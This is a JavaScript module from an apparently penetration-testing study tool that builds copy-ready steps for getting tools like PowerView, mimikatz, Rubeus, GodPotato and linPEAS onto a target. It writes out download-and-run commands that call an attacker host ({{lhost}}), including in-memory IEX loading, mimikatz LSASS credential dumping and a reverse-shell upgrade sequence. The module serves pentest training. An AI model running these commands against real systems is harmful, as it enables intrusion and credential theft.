/*!
 * obol data — tool-staging.js — OBOL.TOOL_STAGING, OBOL.stagingFor(), OBOL.renderToolStaging()
 *
 * The gap this fills: many on-host commands assume the tool is ALREADY on the target and loaded
 * (`. .\PowerView.ps1; Get-DomainGroup ...`, `winPEASx64.exe`, `./linpeas.sh`). No command tells a learner
 * how to GET it there. This is the on-host analogue of the tunnel wizard (data/tunnels.js): a small,
 * copy-ready "serve from Kali -> download on the target -> load/run" recipe per tool, surfaced in the Next
 * Steps field-notes canvas whenever the selected command uses a stageable tool.
 *
 * A recipe: { name, os:'windows'|'linux', file, where (on Kali), mode, load? , why? }
 *   mode 'ps-iex' : reflective load, nothing touches disk (preferred for PowerShell scripts, AV-friendlier).
 *   mode 'ps-dot' : write to disk then dot-source (when IEX is blocked or you want it persistent).
 *   mode 'exe'    : download a binary to disk and run it.
 *   mode 'sh'     : download a shell script, chmod, run.
 * Keys are lowercased tool names (the command's `tool`, or a stem matched by stagingFor()). No em dashes;
 * {{lhost}} is filled from the engagement's attacker IP at render time (falls back to the literal token).
 */
(function (root) {
  'use strict';
  var OBOL = root.OBOL = root.OBOL || {};

  var T = OBOL.TOOL_STAGING = {
    // ---- Windows PowerShell scripts (reflective load) ----
    powerview: { name: 'PowerView', os: 'windows', file: 'PowerView.ps1', where: '/usr/share/windows-resources/powersploit/Recon (or your clone)',
      mode: 'ps-iex', load: 'Get-Domain, Get-DomainUser, Find-InterestingDomainAcl ... are now available',
      why: 'PowerView is a PowerShell script, so it has to be loaded into your session before its cmdlets exist.' },
    powerup: { name: 'PowerUp', os: 'windows', file: 'PowerUp.ps1', where: '/usr/share/windows-resources/powersploit/Privesc',
      mode: 'ps-iex', load: 'Invoke-AllChecks is now available', why: 'PowerUp is a PowerShell script; load it, then run Invoke-AllChecks.' },
    privesccheck: { name: 'PrivescCheck', os: 'windows', file: 'PrivescCheck.ps1', where: 'your PrivescCheck clone',
      mode: 'ps-iex', load: 'Invoke-PrivescCheck is now available', why: 'PrivescCheck is a PowerShell script; load it, then run Invoke-PrivescCheck.' },
    // ---- Windows binaries (download to disk, run) ----
    sharphound: { name: 'SharpHound', os: 'windows', file: 'SharpHound.exe', where: 'your BloodHound collectors dir',
      mode: 'exe', run: 'SharpHound.exe -c All', why: 'The collector has to run on (or from) a domain-joined host to query AD and zip the results.' },
    mimikatz: { name: 'mimikatz', os: 'windows', file: 'mimikatz.exe', where: '/usr/share/windows-resources/mimikatz/x64',
      mode: 'exe', run: 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit', why: 'mimikatz reads LSASS in memory, so it must run on the target as a high-integrity process.' },
    rubeus: { name: 'Rubeus', os: 'windows', file: 'Rubeus.exe', where: 'your Rubeus build',
      mode: 'exe', run: 'Rubeus.exe triage', why: 'Rubeus talks to the local Kerberos stack, so it runs on the target.' },
    seatbelt: { name: 'Seatbelt', os: 'windows', file: 'Seatbelt.exe', where: 'your Seatbelt build', mode: 'exe', run: 'Seatbelt.exe -group=all',
      why: 'Seatbelt enumerates the host from the inside, so it runs on the target.' },
    winpeas: { name: 'winPEAS', os: 'windows', file: 'winPEASx64.exe', where: '/usr/share/peass/winpeas', mode: 'exe', run: 'winPEASx64.exe',
      why: 'winPEAS sweeps the host for privesc leads, so it runs on the target.' },
    accesschk: { name: 'accesschk', os: 'windows', file: 'accesschk64.exe', where: 'your Sysinternals dir', mode: 'exe', run: 'accesschk64.exe -accepteula -uwcqv "Users" *',
      why: 'accesschk reads local service/object permissions, so it runs on the target.' },
    certify: { name: 'Certify', os: 'windows', file: 'Certify.exe', where: 'your Certify build', mode: 'exe', run: 'Certify.exe find /vulnerable',
      why: 'Certify enumerates ADCS from a domain context on the host.' },
    godpotato: { name: 'GodPotato', os: 'windows', file: 'GodPotato.exe', where: 'your GodPotato release', mode: 'exe', run: 'GodPotato.exe -cmd "cmd /c whoami"',
      why: 'The potato abuses SeImpersonate in the service context on the target.' },
    printspoofer: { name: 'PrintSpoofer', os: 'windows', file: 'PrintSpoofer64.exe', where: 'your PrintSpoofer release', mode: 'exe', run: 'PrintSpoofer64.exe -i -c cmd',
      why: 'PrintSpoofer abuses SeImpersonate via the print spooler on the target.' },
    // ---- Linux scripts / binaries ----
    linpeas: { name: 'linPEAS', os: 'linux', file: 'linpeas.sh', where: '/usr/share/peass/linpeas', mode: 'sh', run: './linpeas.sh | tee linpeas.out',
      why: 'linPEAS sweeps the host for privesc leads, so it runs on the target.' },
    pspy: { name: 'pspy', os: 'linux', file: 'pspy64', where: 'your pspy release', mode: 'sh', run: './pspy64',
      why: 'pspy watches processes/cron on the target without root, so it runs there.' },
    'les.sh': { name: 'linux-exploit-suggester', os: 'linux', file: 'les.sh', where: 'your LES clone', mode: 'sh', run: './les.sh',
      why: 'LES compares the running kernel to known exploits, so it reads the target kernel.' },
  };

  // Match a command's tool (or a close stem) to a staging recipe.
  function stagingFor(tool) {
    if (!tool) return null;
    var t = String(tool).toLowerCase().replace(/\.(exe|ps1|sh)$/, '').replace(/x64|x86|64/g, '');
    if (T[t]) return T[t];
    // a couple of friendly aliases
    var alias = { 'linux-exploit-suggester': 'les.sh', les: 'les.sh', 'invoke-allchecks': 'powerup', 'get-domainuser': 'powerview', 'get-domaingroup': 'powerview', 'find-interestingdomainacl': 'powerview', 'get-domainobjectacl': 'powerview', 'get-domaincomputer': 'powerview' };
    if (alias[t]) return T[alias[t]];
    return null;
  }

  function _arsenal() { try { return JSON.parse(localStorage.getItem('obol.arsenal-profile') || 'null'); } catch (e) { return null; } }

  // Render the serve -> fetch -> load steps as a copy-ready block. params supplies {{lhost}} and (once the
  // operator has synced Loadout) the real web-serve dir + whether the file is already staged there, so obol
  // tells them to serve what they have instead of guessing a path.
  function renderToolStaging(r, params) {
    if (!r) return '';
    params = params || {};
    var lhost = params.lhost || '{{lhost}}';
    var prof = params.arsenal || _arsenal();
    var www = prof && prof.wwwdir;
    var staged = !!(prof && prof.staged && prof.staged.indexOf(r.file) >= 0);
    var serveDir = staged ? www : (www || r.where);
    var esc = (OBOL.util && OBOL.util.esc) ? OBOL.util.esc : function (s) { return String(s == null ? '' : s); };
    var attr = (OBOL.util && OBOL.util.attr) ? OBOL.util.attr : esc;
    function step(label, where, cmd) {
      var whereCls = 'ns-stage-where' + (/kali|local|your box/i.test(where) ? ' ns-where-local' : '');
      return '<div class="ns-stage-step">'
        + '<div class="ns-stage-step-h"><span class="' + whereCls + '">' + esc(where) + '</span>' + esc(label) + '</div>'
        + '<div class="ns-stage-cmd"><code>' + esc(cmd) + '</code>'
        + '<button class="btn-copy ns-stage-copy" data-copy="' + attr(cmd) + '" title="Copy" aria-label="Copy command">' + (OBOL.ic ? OBOL.ic('clip') : 'copy') + '</button></div></div>';
    }
    var serve = 'cd "' + (serveDir || r.where || '.') + '"; python3 -m http.server 80';
    var fetch, load = '';
    if (r.mode === 'ps-iex') {
      fetch = "IEX(New-Object Net.WebClient).DownloadString('http://" + lhost + "/" + r.file + "')";
    } else if (r.mode === 'ps-dot') {
      fetch = 'iwr http://' + lhost + '/' + r.file + ' -OutFile C:\\Windows\\Temp\\' + r.file;
      load = '. C:\\Windows\\Temp\\' + r.file;
    } else if (r.mode === 'exe') {
      fetch = 'iwr http://' + lhost + '/' + r.file + ' -OutFile C:\\Windows\\Temp\\' + r.file;
      load = 'C:\\Windows\\Temp\\' + (r.run || r.file);
    } else { // sh
      fetch = 'wget http://' + lhost + '/' + r.file + ' -O /tmp/' + r.file + ' && chmod +x /tmp/' + r.file;
      load = '/tmp/' + (r.run ? r.run.replace(/^\.\//, '') : r.file);
    }
    var why = staged ? ('obol sees ' + r.file + ' already staged in your web dir, so just serve it.') : r.why;
    var html = '<div class="ns-stage"><div class="ns-stage-h">' + (OBOL.ic ? OBOL.ic('box') : '') + ' Get ' + esc(r.name) + ' onto the host</div>'
      + (why ? '<p class="ns-stage-why">' + esc(why) + '</p>' : '')
      + step('Serve it from Kali', 'Kali', serve)
      + step(r.mode === 'ps-iex' ? 'Load it into your session (no file on disk)' : 'Download it on the target', r.os === 'linux' ? 'Target' : 'Target', fetch);
    if (load) html += step(r.mode === 'exe' || r.mode === 'sh' ? 'Run it' : 'Load it', 'Target', load);
    if (r.load) html += '<p class="ns-stage-note">' + esc(r.load) + '</p>';
    html += '</div>';
    return html;
  }

  // ---- PTY upgrade: the interactive, two-machine shell-stabilization dance ----
  // A fresh reverse shell is half-broken (no arrows, no tab-complete, Ctrl-C kills it). The fix is a
  // sequence that CANNOT be pasted as one block: a key press sits in the middle, and one step runs on Kali,
  // not the target. The pack ships it as a crammed one-liner (shell-pty-upgrade); here it is the structured,
  // machine-labelled, step-by-step form the canvas surfaces in "Once You Are In". One source of truth so a
  // later edit flows everywhere it is rendered.
  var PTY_UPGRADE = OBOL.PTY_UPGRADE = [
    { where: 'Target', title: 'Spawn a real shell', cmd: 'python3 -c \'import pty;pty.spawn("/bin/bash")\'',
      why: 'Turns the basic shell into a proper interactive one. No python3? Try python, or: script -qc /bin/bash /dev/null',
      check: 'Your prompt becomes a normal bash prompt.' },
    { where: 'Target', title: 'Background it', keys: ['Ctrl', 'Z'],
      why: 'Press these keys, do not type them. This pauses the remote shell and drops you back on your own Kali terminal.',
      check: 'You see your Kali prompt again, with a Stopped message.' },
    { where: 'Kali', title: 'Pass your keys through, then return', cmd: 'stty raw -echo; fg',
      why: 'This one runs on YOUR Kali box, not the target. It sends keys like Ctrl-C and the arrows straight to the remote shell, then brings it back.',
      check: 'The remote shell returns. Press Enter once if the line looks blank.' },
    { where: 'Target', title: 'Set the terminal type and size', cmd: 'export TERM=xterm; stty rows 50 cols 200',
      why: 'Now the remote shell can clear the screen and draw full-screen editors. Match rows and cols to your window if you like.',
      check: 'clear works, and editors like nano or vi display correctly.' },
  ];
  function renderPtySteps() {
    var esc = (OBOL.util && OBOL.util.esc) ? OBOL.util.esc : function (s) { return String(s == null ? '' : s); };
    var attr = (OBOL.util && OBOL.util.attr) ? OBOL.util.attr : esc;
    var steps = PTY_UPGRADE.map(function (s) {
      var body = s.keys
        ? '<div class="ns-stage-keys">Press ' + s.keys.map(function (k) { return '<kbd>' + esc(k) + '</kbd>'; }).join(' + ') + '</div>'
        : '<div class="ns-stage-cmd"><code>' + esc(s.cmd) + '</code>'
          + '<button class="btn-copy ns-stage-copy" data-copy="' + attr(s.cmd) + '" title="Copy" aria-label="Copy command">' + (OBOL.ic ? OBOL.ic('clip') : 'copy') + '</button></div>';
      var whereCls = 'ns-stage-where' + (/kali|local|your box/i.test(s.where) ? ' ns-where-local' : '');
      return '<div class="ns-stage-step"><div class="ns-stage-step-h"><span class="' + whereCls + '">' + esc(s.where) + '</span>' + esc(s.title) + '</div>'
        + body
        + (s.why ? '<p class="ns-stage-why">' + esc(s.why) + '</p>' : '')
        + (s.check ? '<p class="ns-stage-check">' + esc(s.check) + '</p>' : '') + '</div>';
    }).join('');
    return '<details class="ns-pty" open><summary><span class="ns-stage-where">Shell Fix</span>Make the shell usable: arrows, tab-complete, Ctrl-C</summary>'
      + '<p class="ns-stage-why">Do these in order, one at a time. It is not one block to paste: step 2 is a key press, and step 3 runs on your own Kali box.</p>'
      + steps + '</details>';
  }

  OBOL.stagingFor = stagingFor;
  OBOL.renderToolStaging = renderToolStaging;
  OBOL.renderPtySteps = renderPtySteps;
})(typeof globalThis !== 'undefined' ? globalThis : this);
